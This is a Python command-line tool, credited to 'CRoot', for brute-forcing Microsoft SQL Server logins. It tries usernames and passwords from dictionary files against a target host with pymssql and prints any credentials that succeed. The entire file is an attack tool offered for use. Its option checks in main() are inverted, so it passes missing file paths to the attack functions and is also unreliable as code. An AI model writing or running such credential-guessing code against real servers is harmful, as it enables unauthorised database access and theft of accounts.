#!/usr/bin/env python
# coding=utf-8

# -----------------------------------------------
# Author: CRoot
# descript:mssql psaaword burte

import pymssql
import argparse
from colorama import Fore, Style


def chekpassword(ms_server, ms_user, ms_password):
    # connect mssql to check password
    try:
        conn = pymssql.connect(ms_server, ms_user.strip('\n'), ms_password.strip('\n'), 'tempdb', charset='UTF-8')
        cur = conn.cursor()
        if not cur:
            return 0
        else:
            return 1
    except Exception as Error:
        return 0
    return 1


def dict_attack(host, username_file, password_file):
    user_handle = open(username_file)
    for user in user_handle:
        password_handle = open(password_file)
        for pwd in password_handle:
            print (Fore.RED + "[***] " + Style.RESET_ALL + "Try to UserName:%s  Password:%s" % (user, pwd))
            if chekpassword(host, user, pwd) == 1:
                print (Fore.GREEN + "[OK] " + Style.RESET_ALL + "Got password. user_name:%s Password:%s" % (user, pwd))
                break


def FixUserAttack(host, user_name, password_file):
    password_handle = open(password_file)
    for line in password_handle:
        print(Fore.RED + "[***] " + Style.RESET_ALL + "Try to UserName:%s  Password:%s" % (user_name, line))
        if chekpassword(host, user_name, line) == 1:
            print(Fore.GREEN + "[OK] " + Style.RESET_ALL + "Got password. user_name:%s Password:%s" % (user_name, line))
            break


def main():
    parser = argparse.ArgumentParser(description='Attack mssql server password by CRoot')
    parser.add_argument('-s', metavar='HostAddr', help='Set host address')
    parser.add_argument('-l', metavar='user_name', help='FixUser to attack')
    parser.add_argument('-L', metavar='user_name File', help='Use username dictionary to attach')
    parser.add_argument('-P', metavar='Password File', help='Use password dictionary to attach')
    option = parser.parse_args()

    if not option.s:
        parser.print_help()
        exit(0)

    if not option.l and not option.P:
        FixUserAttack(option.s, option.l, option.P)
    elif not option.L and not option.P:
        dict_attack(option.s, option.L, option.P)
    else:
        parser.print_help()


if __name__ == '__main__':
    main()
